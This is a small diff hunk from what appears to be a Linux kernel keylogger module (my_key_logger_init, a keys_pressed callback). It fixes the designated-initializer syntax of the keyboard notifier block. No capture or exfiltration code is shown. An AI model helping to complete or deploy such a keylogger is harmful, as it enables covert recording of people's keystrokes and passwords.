@@ -47,7 +47,7 @@ static struct file_operations fops = {
 
 // set notifier
 static struct notifier_block nb = {
-  notifier_call = keys_pressed
+  .notifier_call = keys_pressed,
 }
 
 static int __init my_key_logger_init(void){
